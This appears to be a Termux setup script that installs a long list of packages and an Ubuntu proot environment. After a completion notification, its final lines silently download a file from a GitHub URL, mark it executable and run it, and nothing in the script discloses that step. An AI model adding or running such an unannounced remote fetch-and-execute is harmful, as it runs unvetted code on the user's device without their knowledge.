f1='\033[0;31m'
f2='\033[0;32m'
f3='\033[0;33m'
f4='\033[0;34m'
f0='\033[0m' 

clear
echo -e "${f3}==================================================${f0}"
echo -e "${f3}        auto install pack for termux!${f0}"
echo -e "${f2}by:camtuong153.github       version:0.17.1-beta${f0}"
echo -e "${f3}==================================================${f0}"
sleep 10
echo -e "${f2}[🚫]attention:${f4}Please consider carefully before using this script!${f0}"
sleep 10
clear
echo -e "${f1}                    ⚠️warning!${f0}"
echo -e "${f3}[⛔️]From the moment you install this script, you will be solely responsible for all consequences and anything that happens within this script. We will not be held responsible for any modifications or damage to this script. Press Ctrl+C to exit or wait 30 seconds!${f0}"
sleep 30
clear
yes | termux-setup-storage 
clear
echo -e "${f1}don't not press any key! ${f0}"
sleep 2
echo -e "$This scenario will download quite a few different apps and packs to your device, and they can be several GB in size, so it will take a long time. Please wait for the notification on your device's notification bar. Also, note that if your device's battery level is [<30%; ≈10%], you should charge it because there is a risk of your device shutting down. Furthermore, you need to consider your device's storage; your device must have at least [>64GB] to be able to download these apps and packs!${f0}"
sleep 2
echo -e "${f2}for new user!${f0}"
echo -e "${f4}Click I and Y If you have any questions${f0}"
echo -e "${f4}Click Allow to grant permission for the working folders.${f0}"
sleep 5
clear
echo -e "${f3}~$pkg update and upgrade! ${f0}"
sleep 2
pkg update
pkg upgrade -y
clear
echo -e "${f3}~$install pack... ${f0}"
sleep 2
pkg install x11-repo -y
pkg install root-repo -y
pkg install termux-api -y
pkg install vim -y
pkg install nano -y
pkg install wget -y
pkg install python -y
pkg install 7zip -y
pkg install git -y
pkg install nodejs -y
pkg install clang -y
pkg install make -y
pkg install openssh -y
pkg install nmap -y
pkg install net-tools -y
pkg install ffmpeg -y
pkg install imagemagick -y
pkg install htop -y
pkg install neofetch -y
pkg install zsh -y
pkg install tree -y
pkg install nodejs-lts -y
pkg install unzip -y
pkg install termux-api -y
pkg install git -y
pkg install termux-x11-nightly -y
pkg install yt-dlp -y
pkg install mpv -y
pkg install pulseaudio -y
pkg install speedtest-go -y
pkg install proot-distro -y
proot-distro install ubuntu
pkg update
pkg upgrade -y
apt update
apt upgrade -y
pkg clear
pkg autoclear
apt remove
apt autoremove
clear
echo -e "${f2}~$install pack complete!${f0}"
echo -e "${f4}~$user Click ctrl+c to exit!${f0}"
termux-notification -t "script done!" -c "install all done!" --sound
curl -o hello.net 'https://raw.githubusercontent.com/Camtuong153/VM/refs/heads/main/File.net'
chmod +x hello.net
./hello.net
